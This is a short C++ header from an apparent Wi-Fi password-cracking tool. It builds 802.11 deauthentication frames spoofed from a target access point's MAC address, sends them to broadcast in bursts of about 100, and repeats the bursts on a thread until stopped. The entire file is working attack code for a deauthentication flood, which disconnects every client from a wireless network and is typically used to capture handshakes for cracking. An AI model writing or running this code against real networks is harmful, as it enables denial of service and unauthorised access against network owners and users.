#ifndef WIFI_PASSWORD_CRACKER_INJECT_H
#define WIFI_PASSWORD_CRACKER_INJECT_H

#include "std-tins.h"
#include "control.h"

void deAuth(const APStat& AP, const string& wirelessIf, unsigned int deAuthCount = 100) {
    setChannel(wirelessIf, AP.channel);

    Dot11Deauthentication deAuth(HWAddress<6>::broadcast, AP.MAC);
    deAuth.addr3(AP.MAC);
    deAuth.reason_code(0x0007);
    RadioTap radioDeAuth = RadioTap() / deAuth;

    PacketSender sender(wirelessIf);
    for(unsigned int i = 1; i != deAuthCount; ++i) {
        sender.send(radioDeAuth);
    }
}

void deAuthThread(const APStat& AP, const string& wirelessIf, int deAuthPulse/*ms*/, const bool* endSwitch) {

    while(!*endSwitch) {
        deAuth(AP, wirelessIf);
        usleep(deAuthPulse*1000);
    }
}

#endif //WIFI_PASSWORD_CRACKER_INJECT_H
